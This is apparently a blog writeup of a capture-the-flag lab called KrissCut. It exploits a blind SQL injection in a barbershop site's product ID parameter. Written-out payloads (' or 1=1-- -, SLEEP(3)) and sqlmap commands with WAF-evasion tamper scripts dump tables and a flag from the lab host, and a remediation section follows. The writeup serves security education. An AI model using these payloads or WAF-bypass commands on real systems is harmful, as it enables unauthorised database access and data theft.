---
title: "WebVerse: KrissCut"
date: 2026-06-16
weight: 4
tags: ["webverse","SQLi"]
author: "Gourav."
showToc: true
TocOpen: false
hidemeta: false
description: "Boolean-based blind SQL injection with WAF bypass via sqlmap tamper scripts — Challenge Lab Writeup."
summary: "Boolean-based blind SQL injection with WAF bypass via sqlmap tamper scripts — Challenge Lab Writeup."
hideSummary: false
ShowReadingTime: true
ShowPostNavLinks: true
ShowWordCount: true
UseHugoToc: true
cover:
    image: "/images/krisscut_cover.svg"
    alt: "KrissCut challenge"
    caption: "KrissCut challenge (SQLi)"
    relative: false
    hidden: false
---

{{< callout warning >}}

**Lab:** **KrissCut**

**Category:** Web Security / SQL Injection

**Vulnerability:** **Boolean-based blind SQLi** with WAF keyword filter bypass via tamper scripts

**Platform:** webverse

{{< /callout>}}

{{< figure align="center" src="/images/KrissCut_1.png" caption="*KrissCut Challenge*" >}}

## Lab Description

{{< callout insight "Briefing" >}}
*Kris has run the place since 2009. The website came later, built cheap by a cousin who "knew a bit of code" and bolted a security filter onto the catalogue after a scare. The filter looks the part — but it was written in a hurry.*
{{< /callout>}}

---

## Visiting the Site

The target is a barbershop storefront — clean UI, nothing immediately suspicious.

{{< figure align="center" src="/images/KrissCut_2.png" caption="*KrissCut homepage — barbershop storefront*" >}}

Browsing to the {{< badge gray >}}SHOP{{< /badge >}} section and clicking any product reveals something useful in the URL: a {{< badge yellow >}}?id={{< /badge >}} parameter that drives the product lookup.

{{< figure align="center" src="/images/KrissCut_3.png" caption="*Product page — id parameter visible in URL*" >}}

There's no visible reflection of the input on the page, so this isn't a simple reflected injection — but the parameter is worth probing.

## Confirming SQL Injection

We swap the numeric ID for a non-existent string value {{< badge gray >}}test{{< /badge >}} — the server returns a generic *"We couldn't find that one"* message.

{{< figure align="center" src="/images/KrissCut_4.png" caption="*id=test — generic not-found response*" >}}

Adding a single quote {{< badge red >}}test'{{< /badge >}} produces a very different response: a raw MariaDB syntax error leaked straight to the page.

{{< figure align="center" src="/images/KrissCut_5.png" caption="*id=test' — SQL syntax error confirms injection point*" >}}

```
(1064, "You have an error in your SQL syntax; check the manual that
corresponds to your MariaDB server version for the right syntax to
use near ''test''' at line 1")
```

The backend is passing our input directly into a SQL query — the injection is confirmed.

## Probing the WAF

### Boolean bypass works

We test a classic boolean bypass: {{< badge red >}}test' or 1=1-- -{{< /badge >}}. The server returns a valid product, meaning the condition evaluated to true — the boolean path is open.

{{< figure align="center" src="/images/KrissCut_6.png" caption="*id=test' or 1=1-- - — boolean bypass returns a product*" >}}

### UNION is blocked

A {{< badge red >}}UNION SELECT{{< /badge >}} probe immediately triggers the filter:

{{< figure align="center" src="/images/KrissCut_7.png" caption="*UNION SELECT blocked — WAF keyword filter active*" >}}

The error reads *"Request blocked — Our catalog security filter flagged something in that request."* The filter is catching {{< badge red >}}UNION{{< /badge >}} and {{< badge red >}}SELECT{{< /badge >}} keywords. Various manual bypass attempts from PortSwigger's filter-bypass reference don't stick — the regex is specifically watching for these words.

### Time-based blind also works

We try {{< badge red >}}test' AND SLEEP(3)-- -{{< /badge >}}. The page hangs for roughly three seconds before returning the not-found message — confirming the injection executes asynchronously and a **time-based blind** path is available too.

{{< figure align="center" src="/images/KrissCut_8.png" caption="*id=test' AND SLEEP(3)-- - — 3s delay confirms time-based blind*" >}}

So we have two working injection paths — boolean-based blind and time-based blind — but the WAF blocks any attempt to use {{< badge red >}}UNION SELECT{{< /badge >}} for direct data retrieval. We hand this over to {{< badge purple >}}sqlmap{{< /badge >}}.


## Enumerating Databases with sqlmap

We point sqlmap at the injectable parameter, marking the injection point with {{< badge yellow >}}*{{< /badge >}}, and ask it to enumerate databases. The {{< badge gray >}}--random-agent{{< /badge >}} flag rotates the User-Agent to reduce fingerprinting noise.

```bash
$ sqlmap -u 'https://92db9aa8-4575-krisscut-f5ec4.events.webverselabs-pro.com/product?id=test*' \
  --batch --dbs --random-agent
```

{{< figure align="center" src="/images/KrissCut_9.png" caption="*sqlmap — heuristic confirms MySQL, begins injection testing*" >}}

sqlmap confirms the back-end is {{< badge blue >}}MySQL{{< /badge >}} and identifies the injection type as **boolean-based blind** (OR clause with MySQL comment). After testing, it falls back to the current database when direct enumeration hits {{< badge red >}}403{{< /badge >}} responses — and retrieves the database name:

{{< figure align="center" src="/images/KrissCut_10.png" caption="*sqlmap — database name krisscut retrieved, 403s during enumeration*" >}}

```
[*] krisscut
```

The WAF is returning {{< badge red >}}403 Forbidden{{< /badge >}} on many requests during the dump — 255 times according to the log. We need tamper scripts to get further.


## Dumping Tables — WAF Bypass with Tamper Scripts

A straight {{< badge gray >}}--tables{{< /badge >}} run against the {{< badge blue >}}krisscut{{< /badge >}} database hits the WAF hard — sqlmap can't retrieve any table names and reports *"No tables found"* with 403s throughout:

{{< figure align="center" src="/images/KrissCut_11.png" caption="*sqlmap --tables — blocked, no tables found without tamper*" >}}

We add three tamper scripts to mangle the payload away from the filter's patterns:

- {{< badge purple >}}space2comment{{< /badge >}} — replaces spaces with `/**/` to break keyword detection
- {{< badge purple >}}between{{< /badge >}} — rewrites comparisons using `BETWEEN` to avoid `=` scrutiny
- {{< badge purple >}}randomcase{{< /badge >}} — randomises keyword casing (`SeLeCt`, `UnIoN`) to defeat case-sensitive regex

```bash
$ sqlmap -u 'https://92db9aa8-4575-krisscut-f5ec4.events.webverselabs-pro.com/product?id=test*' \
  --batch --random-agent -D krisscut --tables --threads 4 \
  --tamper=space2comment,between,randomcase
```

{{< figure align="center" src="/images/KrissCut_12.png" caption="*sqlmap + tamper scripts — two tables retrieved: products and seirets*" >}}

Two tables surface:

```
Database: krisscut
[2 tables]
+----------+
| products |
| seirets  |
+----------+
```

{{< badge yellow >}}seirets{{< /badge >}} is clearly a typo for {{< badge red >}}secrets{{< /badge >}} — that's where the flag will be.


## Dumping Columns from the secrets Table

We enumerate the columns of the {{< badge yellow >}}seirets{{< /badge >}} table (the real table name at the database level is {{< badge red >}}secrets{{< /badge >}} — the retrieval mismatch is a sqlmap artefact of the blind technique; guessing from context confirms it):

```bash
$ sqlmap -u 'https://92db9aa8-4575-krisscut-f5ec4.events.webverselabs-pro.com/product?id=test*' \
  --batch --random-agent -D krisscut -T secrets --columns --threads 4 \
  --tamper=space2comment,between,randomcase
```

{{< figure align="center" src="/images/KrissCut_13.png" caption="*sqlmap — secrets table has 4 columns: value, id, label, note*" >}}

```
+-------+-------------+
| Column | Type        |
+-------+-------------+
| value  | text        |
| id     | int(11)     |
| label  | varchar(96) |
| note   | text        |
+-------+-------------+
```

The {{< badge green >}}value{{< /badge >}} column is the obvious target.

## Dumping the Flag

We dump just the {{< badge green >}}value{{< /badge >}} column from the {{< badge red >}}secrets{{< /badge >}} table:

```bash
$ sqlmap -u 'https://92db9aa8-4575-krisscut-f5ec4.events.webverselabs-pro.com/product?id=test*' \
  --batch --random-agent -D krisscut -T secrets -C value --dump --threads 4 \
  --tamper=space2comment,between,randomcase
```

{{< figure align="center" src="/images/KrissCut_14.png" caption="*sqlmap dump — secrets table contains the flag*" >}}

```
Database: krisscut
Table: secrets
[3 entries]
+------------------------------------------+
| value                                    |
+------------------------------------------+
| cleanfade-4009???...A?????????            |
| sq0atp-PLACEHOLDER_POS_TOKEN             |
| WEBVERSE{FLAG}                           |
+------------------------------------------+
```

Flag captured.

---

## Why This Works

The vulnerability is a textbook **error-based → boolean-based blind** SQL injection with an incomplete WAF:

1. **Unsanitised parameter.** The {{< badge yellow >}}?id={{< /badge >}} parameter is interpolated directly into a SQL query with no parameterisation or type enforcement.

2. **WAF blocks keywords but not logic.** The filter catches {{< badge red >}}UNION{{< /badge >}} and {{< badge red >}}SELECT{{< /badge >}} as literal strings, but boolean conditions (`OR 1=1`) and time delays (`SLEEP`) pass through unchecked. Blocking keywords is not the same as preventing injection.

3. **Tamper scripts defeat the regex.** Substituting spaces with {{< badge purple >}}/**/{{< /badge >}}, randomising casing (`SeLeCt`), and rewriting comparisons with `BETWEEN` are all well-known WAF evasion techniques — the filter wasn't written to handle them.

4. **Verbose error disclosure.** The raw MariaDB error message in step one told us the exact query structure and DBMS version, dramatically reducing the effort needed to craft working payloads.


## Remediation

| Issue | Fix |
| --- | --- |
| {{< badge yellow >}}?id={{< /badge >}} interpolated directly into SQL | Use **prepared statements / parameterised queries** — the only reliable defence against SQLi |
| WAF keyword filter as primary defence | WAFs are a defence-in-depth layer, not a substitute for safe query construction; parameterisation makes the WAF irrelevant |
| Raw SQL error messages returned to the user | Catch database exceptions server-side and return a generic error; never expose DBMS internals |
| {{< badge red >}}secrets{{< /badge >}} table readable by the web DB user | Apply least-privilege to the database account — the web app should only have `SELECT` on the tables it needs, and never on sensitive tables like {{< badge red >}}secrets{{< /badge >}} |


{{< callout tip "The takeaway" >}}

A keyword-based WAF buys time, not security. As long as the underlying query is built by concatenating user input, an attacker who knows the DBMS can find a bypass — and tools like {{< badge purple >}}sqlmap{{< /badge >}} with tamper scripts do it automatically. **Parameterise your queries.** Everything else is noise.

*Do this lab on webverse Now:* https://dashboard.webverselabs-pro.com/mystery-challenges/krisscut

{{< /callout>}}